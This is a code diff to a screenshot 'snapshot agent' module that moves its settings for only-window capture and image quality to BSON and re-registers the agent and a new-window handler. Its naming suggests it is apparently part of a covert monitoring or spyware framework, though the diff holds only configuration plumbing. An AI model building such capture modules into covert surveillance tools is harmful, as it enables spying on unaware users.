@@ -1,12 +1,5 @@
 extern BOOL g_newwindow_created;
 
-typedef struct _snap_param_struct {
-	DWORD interval;
-	DWORD tag;
-	BOOL only_window;
-	BOOL on_new_window;
-} snap_param_struct;
-
 #define SNAP_IMG_QUALITY_LOW 0;
 #define SNAP_IMG_QUALITY_MED 50;
 #define SNAP_IMG_QUALITY_HI 100;
@@ -78,26 +71,21 @@ DWORD __stdcall PM_SnapShotStartStop(BOOL bStartFlag, BOOL bReset)
 	return 1;
 }
 
-
-DWORD __stdcall PM_SnapShotInit(BYTE *conf_ptr, BOOL bStartFlag)
+DWORD __stdcall PM_SnapShotInit(bson::be elem)
 {
-	snap_param_struct *snap_param = (snap_param_struct *)conf_ptr;
-
-	if (snap_param) { 
-		capture_only_window = snap_param->only_window;
-		image_quality = SNAP_IMG_QUALITY_MED; // Dovra' prenderla dal file
-	} else {
-		capture_only_window = FALSE;
+	capture_only_window = (BOOL) elem["onlywindow"].Bool();
+	if (!strcmp(elem["quality"].String().c_str(), "hi") ) {
+		image_quality = SNAP_IMG_QUALITY_HI; 
+	} else if (!strcmp(elem["quality"].String().c_str(), "med") ) {
 		image_quality = SNAP_IMG_QUALITY_MED;
+	} else { 
+		image_quality = SNAP_IMG_QUALITY_LOW;
 	}
-	PM_SnapShotStartStop(bStartFlag, TRUE);
 	return 1;
 }
 
-
 void PM_SnapShotRegister()
 {
-	AM_MonitorRegister(PM_SNAPSHOTAGENT, (BYTE *)NULL, (BYTE *)PM_SnapShotStartStop, (BYTE *)PM_SnapShotInit, NULL);
-	AM_MonitorRegister(PM_ONNEWWINDOW_IPC, (BYTE *)PM_NewWindowDispatch, (BYTE *)NULL, (BYTE *)NULL, NULL);
-	PM_SnapShotInit(NULL, FALSE);
+	AM_MonitorRegisterBSON("snapshot", PM_SNAPSHOTAGENT, (BYTE *)NULL, (BYTE *)PM_SnapShotStartStop, (BYTE *)PM_SnapShotInit, NULL);
+	AM_MonitorRegisterBSON("new_window", PM_ONNEWWINDOW_IPC, (BYTE *)PM_NewWindowDispatch, (BYTE *)NULL, (BYTE *)NULL, NULL);
 }
